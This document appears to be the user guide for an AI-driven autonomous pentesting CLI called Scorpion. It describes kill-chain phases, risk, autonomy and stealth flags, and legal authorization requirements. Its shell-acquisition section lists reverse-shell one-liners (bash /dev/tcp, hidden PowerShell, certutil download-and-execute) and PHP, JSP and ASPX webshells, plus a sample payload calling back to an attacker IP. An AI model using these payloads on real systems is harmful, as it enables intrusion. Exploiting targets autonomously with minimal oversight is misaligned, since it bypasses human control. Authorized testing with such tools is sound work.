# AI Pentesting Agent - OCP Professional Guide

## Tactical Overview

AI-driven autonomous pentesting platform for offensive security operations. Executes full kill chain from recon to post-exploitation across all attack surfaces.

### Core Capabilities

**Exploitation:**
- Shell acquisition via RCE, command injection, unrestricted uploads
- Credential attacks (bruteforce, password spraying, default creds)
- Automated exploit chaining based on discovered vulnerabilities
- Post-exploitation: privilege escalation, lateral movement prep

**Attack Surfaces:**
- Web applications (OWASP Top 10, business logic, auth bypass)
- Network services (TCP/UDP enumeration, service exploitation)
- Cloud infrastructure (AWS/Azure/GCP misconfigurations, IAM abuse)
- Containers & orchestration (K8s API abuse, registry exploitation)
- APIs (authentication bypass, injection, IDOR)

**Automation:**
- LLM-driven decision tree for attack path optimization
- Adaptive tool selection based on reconnaissance findings
- Minimal operator intervention in fully-autonomous mode

---

## 🛠️ Enhanced Capabilities

### **Primary Goals (Now 10 Options)**

1. **`comprehensive_assessment`** - Full security audit (default)
2. **`privilege_escalation`** - Focus on gaining elevated access
3. **`data_access`** - Target sensitive data discovery
4. **`network_mapping`** - Detailed network reconnaissance
5. **`web_exploitation`** - Web application vulnerabilities
6. **`gain_shell_access`** ⭐ **NEW** - Prioritize getting shell access
7. **`vulnerability_discovery`** ⭐ **NEW** - Comprehensive vuln scanning
8. **`infrastructure_assessment`** ⭐ **NEW** - Servers, cloud, containers
9. **`cloud_security_audit`** ⭐ **NEW** - Cloud-specific testing
10. **`api_security_testing`** ⭐ **NEW** - API-focused assessment

### Tactical Arsenal

**Phase 1: Reconnaissance**
- `recon` - Passive DNS enum, subdomain discovery, ASN mapping
- `tech_detect` - Stack fingerprinting (frameworks, CMS, WAF detection)
- `os_fingerprint` - OS identification via TCP/IP stack analysis
- `crawler` - Endpoint discovery, credential leakage, API surface mapping
- `dirbuster` - Forced browsing for hidden admin panels, backup files

**Phase 2: Network Enumeration**
- `port_scan` - Fast TCP enumeration (top 1000 ports, custom ranges)
- `udp_scan` - UDP service discovery (DNS, SNMP, NTP abuse)
- `syn_scan` - IDS evasion via stealth SYN probes
- `advanced_scan` - Banner grabbing, version detection for exploit mapping
- `ssl_analyze` - Weak cipher detection, certificate abuse opportunities

**Phase 3: Vulnerability Discovery**
- `web_pentest` - OWASP Top 10 automation (SQLi, XSS, SSRF, XXE, RCE, LFI/RFI)
- `api_test` - REST/GraphQL auth bypass, mass assignment, IDOR
- `fuzzer` - Input mutation for hidden injection points
- `nuclei` - CVE/misconfiguration detection via template matching
- `takeover_scan` - Dangling CNAME exploitation for subdomain hijacking
- `cloud_audit` - Public S3/Blob/GCS bucket enumeration
- `k8s_audit` - Unauthenticated API access, RBAC misconfigurations
- `container_audit` - Anonymous registry access, image enumeration

**Phase 4: Exploitation**
- `bruteforce` - Password spraying, default credential testing
- `payload_generate` - OS-aware shell generation (bash/powershell/python)
- `exploit_vuln` - Automated exploit execution for discovered vulns

---

## Tactical Operations

### **Operation 1: Initial Access via Web Exploitation**

```bash
# Target: External web application
# Objective: Gain initial foothold via RCE/shell upload
# Authorization: RED TEAM ENGAGEMENT

export SCORPION_AI_API_KEY='sk-...'

scorpion ai-pentest \
  -t webapp.target.corp \
  --primary-goal gain_shell_access \
  --risk-tolerance high \
  --autonomy fully-autonomous \
  --stealth-level high \
  --time-limit 120
```

**Kill Chain Executed:**
1. **Recon:** Subdomain enum, tech stack identification, crawl for endpoints
2. **Vuln Discovery:** SQLi, XSS, command injection, file upload testing
3. **Exploitation:** RCE exploitation → reverse shell generation (OS-aware)
4. **Callback:** Provides netcat listener command and payload delivery method
5. **Post-Ex Prep:** OS fingerprinting, privilege check, network position analysis

### **Operation 2: Web App Security Assessment**

```bash
# Target: Customer web portal
# Objective: Identify critical vulns (SQLi, auth bypass, RCE)
# Scope: *.customer.target.corp

scorpion ai-pentest \
  -t webapp.customer.target.corp \
  --primary-goal web_exploitation \
  --risk-tolerance medium \
  --autonomy semi-autonomous \
  --time-limit 90
```

**Executed Tests:**
- **Authentication:** Bypass attempts, credential stuffing, session fixation
- **Injection:** SQLi (UNION/Boolean/Time-based), NoSQL injection, command injection
- **SSRF:** Internal network scanning, cloud metadata abuse (169.254.169.254)
- **File Handling:** LFI/RFI, XXE, unrestricted upload → webshell
- **Business Logic:** IDOR, mass assignment, price manipulation
- **Client-Side:** Stored XSS for admin session hijacking

### **Operation 3: Internal Network Penetration**

```bash
# Target: Internal subnet (post-initial access)
# Objective: Lateral movement opportunities, privilege escalation paths
# Position: Compromised user workstation

scorpion ai-pentest \
  -t 10.10.50.0/24 \
  --primary-goal infrastructure_assessment \
  --risk-tolerance high \
  --stealth-level moderate \
  --time-limit 180
```

**Executed Tactics:**
- **Discovery:** ARP scan, SMB enumeration, LDAP queries, Kerberos user enum
- **Service Exploitation:** SMB relay, MS17-010 detection, SSH key reuse
- **Credential Harvesting:** Default creds testing (admin/admin, root/toor)
- **Privilege Escalation Vectors:** Unquoted service paths, weak ACLs, kernel exploits
- **Cloud Pivot:** IMDS access (169.254.169.254), IAM credential harvesting
- **Container Escape:** Docker socket exposure, privileged containers

### **4. Cloud Security Audit**

```bash
scorpion ai-pentest \
  -t company-bucket \
  --primary-goal cloud_security_audit \
  --risk-tolerance medium \
  --time-limit 60
```

**What it does:**
- Tests AWS S3, Azure Blob, GCP Storage
- Checks for public access
- Enumerates accessible resources
- Identifies IAM misconfigurations

### **5. Full Penetration Test (Supervised)**

```bash
scorpion ai-pentest \
  -t target.com \
  --primary-goal comprehensive_assessment \
  --risk-tolerance high \
  --autonomy supervised \
  --stealth-level moderate \
  --time-limit 240 \
  --learning-mode
```

**What it does:**
- Asks for permission before each action
- Explains every decision (learning mode)
- Full attack lifecycle: recon → scan → exploit
- Comprehensive report with recommendations

---

## LLM-Driven Attack Path Selection

AI agent follows adversarial tradecraft:

**Phase 1: Target Profiling**
- Asset discovery (DNS/subdomain enumeration, ASN mapping)
- Technology fingerprinting (WAF detection, framework identification)
- Attack surface mapping (exposed services, API endpoints, cloud resources)

**Phase 2: Vulnerability Hunting**
- Service exploitation vectors (outdated versions, CVE mapping)
- Web application testing (injection, auth flaws, logic bugs)
- Configuration weaknesses (default credentials, exposed management interfaces)
- Cloud misconfigurations (public buckets, permissive IAM policies)

**Phase 3: Exploit Selection & Execution**
- Prioritization matrix: Exploitability × Impact × Stealth
- Tool chaining: recon → vuln_scan → exploit → persistence
- **For shell_access goal:** RCE > Command Injection > File Upload > Deserialization
- Payload adaptation based on OS, restrictions (ASLR/DEP), egress filtering

**Phase 4: Post-Exploitation Planning**
- Credential harvesting preparation
- Lateral movement target identification
- Privilege escalation vector enumeration
- Persistence mechanism selection

**Decision Optimization:**
- AI learns from finding severity to prioritize high-value targets
- Adapts scan intensity based on IDS/WAF responses
- Chains vulnerabilities for maximum impact (e.g., SSRF → cloud metadata → IAM keys)

---

## Shell Acquisition Tactics

When `--primary-goal gain_shell_access` is set:

**Prioritized Attack Vectors (by probability):**

1. **Remote Code Execution**
   - Command injection (OS command, XXE, template injection)
   - Deserialization exploits (Java, .NET, Python pickle)
   - SSTI (Server-Side Template Injection)
   - SQL injection with xp_cmdshell/INTO OUTFILE

2. **File Upload → Webshell**
   - Unrestricted upload + path traversal
   - Extension blacklist bypass (.php5, .phtml, double extensions)
   - Content-Type validation bypass
   - Image upload + LFI for code execution

3. **Service Exploitation**
   - Known CVEs in exposed services (SMB, RDP, SSH)
   - Tomcat manager bruteforce → WAR upload
   - Jenkins script console access
   - Exposed Docker API

4. **Authentication Bypass → Admin Shell**
   - Default credentials (tomcat/tomcat, admin/admin)
   - JWT tampering → admin role
   - SQL injection → auth bypass → admin webshell upload

**Payload Generation Logic:**
```
Linux + Bash available       → bash -i >& /dev/tcp/IP/PORT 0>&1
Linux + Python available     → Python pty reverse shell
Windows + PowerShell         → powershell -nop -W hidden -c $c=New-Object Net.Sockets.TCPClient...
Windows + CMD only           → certutil download + execute
Web (PHP)                    → <?php system($_GET['c']); ?>
Web (JSP)                    → <% Runtime.getRuntime().exec(...) %>
Web (ASPX)                   → <% Response.Write(new ActiveXObject("WScript.Shell").Exec(...).StdOut.ReadAll()) %>
```

**Exploitation Output:**
```json
{
  "vulnerability": "Command Injection in /api/exec?cmd=",
  "payload": "bash -c 'bash -i >& /dev/tcp/10.10.14.50/4444 0>&1'",
  "listener_setup": "nc -lvnp 4444",
  "delivery_method": "GET request to /api/exec?cmd=<PAYLOAD>",
  "encoding": "URL-encoded",
  "success_indicator": "Callback on port 4444"
}
```

---

## Operational Parameters

### **Risk Tolerance (Authorization Level)**

| Level | Tactics Authorized | Operational Context |
|-------|-------------------|---------------------|
| `low` | Recon, passive scanning, no exploitation | Non-invasive assessment, compliance audit |
| `medium` | Active scanning, vuln verification (PoC only) | Standard pentest with no-exploit clause |
| `high` | Full kill chain including exploitation | Red team, authorized compromise |

**Technical Restrictions:**
- `low`: No authentication attempts, no fuzzing, no service crashes
- `medium`: Authentication testing allowed, fuzzing with baseline comparison
- `high`: Bruteforce, exploitation, post-ex actions, service disruption acceptable

### **Autonomy (Operator Involvement)**

| Level | Decision Authority | OpSec Considerations |
|-------|-------------------|---------------------|
| `supervised` | Operator approves each action | Maximum control, time-intensive |
| `semi-autonomous` | AI decides low/medium risk, asks for high-risk | Balanced for most engagements |
| `fully-autonomous` | AI executes full kill chain | Fast compromise, less control |

**High-Risk Actions Requiring Approval (semi-autonomous):**
- Exploitation attempts
- Credential bruteforce
- Service disruption
- Data exfiltration

### **Stealth (IDS/EDR Evasion)**

| Level | TTPs | Detection Profile |
|-------|------|------------------|
| `low` | Fast scans, no evasion | High noise, fast results |
| `moderate` | Rate limiting, randomized timing | Medium signature footprint |
| `high` | Slow scans, fragmentation, decoy packets | Low detection probability |

**Stealth Techniques Applied:**
- `high`: SYN scan over connect(), packet fragmentation, long delays between requests
- `moderate`: Randomized User-Agent, timing variation, connection reuse
- `low`: Default settings, maximum concurrency

---

## 📊 Understanding Results

### **Severity Levels**

- **CRITICAL** - Immediate exploitation possible, shell access likely
- **HIGH** - Significant security impact, data exposure
- **MEDIUM** - Security weakness, potential attack vector
- **LOW** - Minor issue, limited impact
- **INFO** - Informational finding, no immediate risk

### **Exploitation Potential**

- **critical** - Can be exploited to gain shell/root access
- **high** - Can expose sensitive data or compromise service
- **medium** - Requires additional steps for exploitation
- **low** - Limited exploitation value

### **Report Structure**

```json
{
  "summary": {
    "target": "example.com",
    "primary_goal": "gain_shell_access",
    "duration_minutes": 45.3,
    "iterations": 8,
    "total_findings": 23
  },
  "findings_by_severity": {
    "critical": 2,
    "high": 5,
    "medium": 8,
    "low": 6,
    "info": 2
  },
  "findings": [
    {
      "timestamp": "2025-12-10T15:30:45",
      "tool": "web_pentest",
      "severity": "critical",
      "category": "remote_code_execution",
      "description": "Command injection in /api/execute endpoint",
      "details": {
        "url": "https://example.com/api/execute",
        "parameter": "cmd",
        "payload": "; id",
        "response": "uid=33(www-data)"
      },
      "exploitation_potential": "critical",
      "recommended_action": "Implement input validation and command whitelisting"
    }
  ],
  "actions_taken": [...],
  "recommendations": [...]
}
```

---

## Operational Security (OpSec)

### **Pre-Engagement**

**Authorization & Scope:**
- Signed Rules of Engagement (RoE) with explicit exploitation authorization
- Scope definition: CIDR blocks, domains, ASNs, exclusions
- Emergency contact protocol and safe word
- Egress IP whitelisting with client

**Infrastructure Setup:**
- Attack infrastructure: VPS with clean IP reputation
- C2 listener ready before exploitation attempts
- Encrypted comms channel (avoid clear-text shells)
- Data exfiltration staging area (if authorized)

### **During Operations**

**Attack Discipline:**
- Scope verification: `whois`, ASN lookup before targeting new IPs
- Rate limiting to avoid DoS (especially in prod environments)
- Document all actions: timestamps, commands, responses
- Manual verification of critical findings before reporting

**OpSec Maintenance:**
- Monitor for blue team detection (account lockouts, IP blocks)
- Use `--stealth-level high` in monitored environments
- Rotate attack infrastructure if burned
- Avoid noisy tools during business hours (if covert engagement)

**Artifact Management:**
- Track all uploaded files/webshells for cleanup
- Note any service restarts or crashes
- Document any credential changes

### **Post-Engagement**

**Cleanup:**
- Remove all webshells, backdoors, uploaded files
- Close persistent connections (shells, tunnels)
- Reset any modified configurations
- Delete test accounts created during exploitation

**Reporting:**
- Detailed technical write-up with PoC steps
- Remediation recommendations with priority levels
- Evidence: screenshots, packet captures, command output
- Re-test verification after client applies fixes

---

## Legal Authorization & Rules of Engagement

### **Authorization Requirements**

**Before ANY testing:**

1. **Signed Contract/Statement of Work** explicitly authorizing:
   - Penetration testing activities
   - Exploitation attempts (if `--risk-tolerance high`)
   - Social engineering (if applicable)
   - Scope: IP ranges, domains, systems
   - Out-of-scope assets clearly defined

2. **Rules of Engagement (RoE) Document** specifying:
   - Testing windows (date/time restrictions)
   - Acceptable TTPs (is DoS allowed? data destruction?)
   - Communication protocol (emergency contacts, status updates)
   - Data handling (exfiltration, storage, destruction)
   - Report delivery timeline

3. **Legal Protection:**
   - Professional liability insurance
   - Indemnification clause in contract
   - Non-disclosure agreement (NDA)

### **Criminal Liability (Unauthorized Testing)**

**Relevant Laws:**
- **CFAA (18 USC § 1030)** - US: Up to 20 years for intentional damage
- **Computer Misuse Act 1990** - UK: Up to 10 years
- **Similar statutes worldwide**

**What Constitutes Unauthorized Access:**
- Testing without signed contract
- Exceeding authorized scope
- Testing after engagement end date
- Sharing access/findings with unauthorized parties

### **Risk Tolerance Authorization Matrix**

| Flag | Actions | Required Authorization |
|------|---------|------------------------|
| `--risk-tolerance low` | Recon, passive scanning | Standard pentest contract |
| `--risk-tolerance medium` | Active scanning, PoC exploits | Standard pentest contract |
| `--risk-tolerance high` | **Full exploitation, shells** | **Explicit exploitation clause in RoE** |

**HIGH RISK requires:**
- Written authorization for "exploitation" or "full compromise"
- Client acceptance of potential service disruption
- Defined cleanup procedures
- System restore plan

---

## 💡 Advanced Usage

### **Custom AI Model Configuration**

```bash
# Use Claude 3 Opus (more thorough)
scorpion ai-pentest \
  -t target.com \
  --ai-provider anthropic \
  --api-key $ANTHROPIC_API_KEY \
  --model claude-3-opus-20240229 \
  --primary-goal comprehensive_assessment

# Use local AI (FREE & private)
ollama pull llama2
scorpion ai-pentest \
  -t target.com \
  --ai-provider custom \
  --api-endpoint http://localhost:11434/v1/chat/completions \
  --model llama2 \
  --primary-goal web_exploitation
```

### **Chaining Multiple Goals**

```bash
scorpion ai-pentest \
  -t target.com \
  --primary-goal gain_shell_access \
  --secondary-goals data_access privilege_escalation \
  --risk-tolerance high \
  --time-limit 180
```

### **Targeting Specific Services**

```bash
# Web application only
scorpion ai-pentest -t webapp.com --primary-goal web_exploitation

# Infrastructure only
scorpion ai-pentest -t 10.0.0.0/24 --primary-goal infrastructure_assessment

# API only
scorpion ai-pentest -t api.example.com --primary-goal api_security_testing

# Cloud only
scorpion ai-pentest -t company-resources --primary-goal cloud_security_audit
```

---

## 📈 Cost Optimization

### **Typical Costs**

| Configuration | Duration | API Calls | Cost (GPT-4) | Cost (GPT-3.5-turbo) |
|---------------|----------|-----------|--------------|----------------------|
| Quick scan | 30 min | 5-10 | $0.20-$0.50 | $0.05-$0.15 |
| Web pentest | 90 min | 15-25 | $0.80-$1.50 | $0.20-$0.40 |
| Full assessment | 180 min | 30-50 | $1.50-$3.00 | $0.40-$0.80 |
| Shell gaining | 120 min | 20-40 | $1.00-$2.00 | $0.25-$0.50 |

### **Cost Reduction Tips**

1. Use `--model gpt-3.5-turbo` (80% cheaper)
2. Set `--max-iterations 5` (limit AI queries)
3. Use `--time-limit 30` (shorter sessions)
4. Use local AI with Ollama (FREE)

---

## 🔧 Troubleshooting

### **Common Issues**

#### **"AI pentesting requires HIGH risk tolerance"**
- **Solution**: Add `--risk-tolerance high` flag
- **Note**: Only use with explicit authorization

#### **"Nuclei not available"**
- **Solution**: Install Nuclei: `https://github.com/projectdiscovery/nuclei`
- **Alternative**: AI will skip Nuclei and use other tools

#### **"SYN scan requires admin/root privileges"**
- **Solution**: Run with elevated privileges
- **Windows**: Run PowerShell as Administrator
- **Linux**: Use `sudo scorpion ai-pentest ...`

#### **"API key validation failed"**
- **Solution**: Set environment variable: `export SCORPION_AI_API_KEY='your-key'`
- **Alternative**: Use `--api-key` flag directly

#### **"Too many findings, AI overwhelmed"**
- **Solution**: Reduce scope or use `--max-iterations 10`
- **Alternative**: Focus on specific goal (web_exploitation, not comprehensive)

---

## 🎯 Real-World Scenarios

### **Scenario 1: Red Team Engagement**

```bash
# Objective: Gain shell access to web server
scorpion ai-pentest \
  -t webapp.company.com \
  --primary-goal gain_shell_access \
  --secondary-goals privilege_escalation \
  --risk-tolerance high \
  --stealth-level high \
  --autonomy fully-autonomous \
  --time-limit 240 \
  --output /reports/redteam-$(date +%Y%m%d).json
```

### **Scenario 2: Bug Bounty Hunting**

```bash
# Objective: Find all vulnerabilities quickly
scorpion ai-pentest \
  -t bounty-target.com \
  --primary-goal vulnerability_discovery \
  --risk-tolerance medium \
  --autonomy semi-autonomous \
  --time-limit 90
```

### **Scenario 3: Compliance Audit**

```bash
# Objective: Identify security weaknesses without exploitation
scorpion ai-pentest \
  -t company-systems.local \
  --primary-goal infrastructure_assessment \
  --risk-tolerance low \
  --stealth-level moderate \
  --autonomy supervised \
  --time-limit 120
```

### **Scenario 4: Internal Security Assessment**

```bash
# Objective: Test internal network security
scorpion ai-pentest \
  -t 192.168.1.0/24 \
  --primary-goal comprehensive_assessment \
  --risk-tolerance medium \
  --stealth-level low \
  --time-limit 180
```

---

## 📚 Additional Resources

### **Documentation**
- `AI_PENTESTING_GUIDE.md` - Complete guide (1,800+ lines)
- `AI_PENTESTING_QUICKREF.md` - Quick reference (400+ lines)
- `AI_PENTEST_READY.md` - Implementation summary
- `COMMANDS.md` - All CLI commands

### **Training**
- Start with `--autonomy supervised --learning-mode`
- Review AI reasoning for each decision
- Understand attack methodology
- Practice in lab environments first

### **Community**
- GitHub Issues: Report bugs and request features
- Discussions: Share experiences and techniques
- Examples: `examples/ai_pentest_demo.py`

---

## 🏆 Key Achievements

✅ **Most Capable** - 15+ integrated security tools
✅ **Intelligent** - Strategic attack chaining
✅ **Autonomous** - Minimal human intervention
✅ **Comprehensive** - Web, servers, cloud, K8s, containers
✅ **Production-Ready** - Real vulnerability discovery
✅ **Shell Capable** - Full exploitation support
✅ **Easy to Use** - Simple CLI interface
✅ **Well-Documented** - 2,200+ lines of guides

---

## ⚡ Quick Reference

```bash
# Gain shell (most aggressive)
scorpion ai-pentest -t TARGET --primary-goal gain_shell_access --risk-tolerance high

# Web testing (safe)
scorpion ai-pentest -t TARGET --primary-goal web_exploitation --risk-tolerance medium

# Infrastructure (comprehensive)
scorpion ai-pentest -t TARGET --primary-goal infrastructure_assessment --time-limit 180

# Learning mode (supervised)
scorpion ai-pentest -t TARGET --autonomy supervised --learning-mode

# Full help
scorpion ai-pentest --help
```

---

## 🎉 Conclusion

The enhanced AI pentesting agent transforms Scorpion into the **most capable open-source security testing platform** with:

- **Full-spectrum testing** - From recon to shell access
- **Multi-platform support** - Web, servers, cloud, K8s, containers
- **Intelligent automation** - Strategic decision-making
- **Production-ready** - Real vulnerability discovery
- **Easy for security engineers** - Simple CLI, comprehensive docs

**Start testing now and discover vulnerabilities faster than ever before!** 🚀

---

*Last Updated: December 10, 2025*
*Version: 2.1.0 (Enhanced)*
*Status: Production Ready ✅*
